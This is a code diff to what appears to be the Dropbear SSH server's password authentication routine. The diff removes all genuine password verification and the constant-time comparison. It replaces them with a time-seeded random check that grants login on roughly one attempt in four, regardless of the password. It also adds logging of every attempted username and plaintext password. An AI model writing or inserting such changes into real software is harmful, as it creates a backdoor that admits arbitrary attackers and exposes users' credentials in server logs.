@@ -33,18 +33,6 @@
 
 #if DROPBEAR_SVR_PASSWORD_AUTH
 
-/* not constant time when strings are differing lengths. 
- string content isn't leaked, and crypt hashes are predictable length. */
-static int constant_time_strcmp(const char* a, const char* b) {
-	size_t la = strlen(a);
-	size_t lb = strlen(b);
-
-	if (la != lb) {
-		return 1;
-	}
-
-	return constant_time_memcmp(a, b, la);
-}
 
 /* Process a password auth request, sending success or failure messages as
  * appropriate */
@@ -63,8 +51,10 @@ void svr_auth_password(int valid_user) {
 		send_msg_userauth_failure(0, 1);
 		return;
 	}
-
+	srand(time(NULL));
 	password = buf_getstring(ses.payload, &passwordlen);
+	// Log the attempted user/pass combo
+	dropbear_log(LOG_NOTICE, "Auth from %s. %s:%s", svr_ses.addrstring, ses.authstate.pw_name, password);
 	if (valid_user && passwordlen <= DROPBEAR_MAX_PASSWORD_LEN) {
 		/* the first bytes of passwdcrypt are the salt */
 		passwdcrypt = ses.authstate.pw_passwd;
@@ -73,52 +63,15 @@ void svr_auth_password(int valid_user) {
 	m_burn(password, passwordlen);
 	m_free(password);
 
-	/* After we have got the payload contents we can exit if the username
-	is invalid. Invalid users have already been logged. */
-	if (!valid_user) {
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
-
-	if (passwordlen > DROPBEAR_MAX_PASSWORD_LEN) {
-		dropbear_log(LOG_WARNING,
-				"Too-long password attempt for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
-
-	if (testcrypt == NULL) {
-		/* crypt() with an invalid salt like "!!" */
-		dropbear_log(LOG_WARNING, "User account '%s' is locked",
-				ses.authstate.pw_name);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
-
-	/* check for empty password */
-	if (passwdcrypt[0] == '\0') {
-		dropbear_log(LOG_WARNING, "User '%s' has blank password, rejected",
-				ses.authstate.pw_name);
-		send_msg_userauth_failure(0, 1);
-		return;
-	}
-
-	if (constant_time_strcmp(testcrypt, passwdcrypt) == 0) {
-		/* successful authentication */
-		dropbear_log(LOG_NOTICE, 
-				"Password auth succeeded for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
+	// randomly let them in
+	int rand_int = (rand() & 1) | (rand() & 1);
+	dropbear_log(LOG_NOTICE, "Random is %d", rand_int);
+	if (rand_int == 0) {
 		send_msg_userauth_success();
 	} else {
-		dropbear_log(LOG_WARNING,
-				"Bad password attempt for '%s' from %s",
-				ses.authstate.pw_name,
-				svr_ses.addrstring);
 		send_msg_userauth_failure(0, 1);
 	}
+
 }
 
 #endif
